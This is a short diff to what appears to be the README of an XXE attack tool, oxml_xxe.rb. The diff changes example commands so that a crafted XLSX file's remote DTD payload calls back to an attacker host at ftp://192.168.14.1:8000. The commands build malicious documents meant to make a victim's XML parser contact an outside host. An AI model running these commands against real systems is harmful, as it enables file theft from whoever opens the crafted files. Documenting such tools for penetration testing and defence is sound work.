@@ -45,9 +45,9 @@ ruby oxml_xxe.rb -s -i 192.168.14.1:8000
 Select payload 11 ("remote_DTD")
 ```
 
-## Build a XLSX with XXE (connecting back to 192.168.14.1:8000)
+## Build a XLSX with XXE (connecting back to ftp://192.168.14.1:8000)
 ```
-ruby oxml_xxe.rb -f samples/sample.xlsx -s -i 192.168.14.1:8000
+ruby oxml_xxe.rb -f samples/sample.xlsx -s -i ftp://192.168.14.1:8000
 
 Select payload 11 ("remote_DTD")
 ```
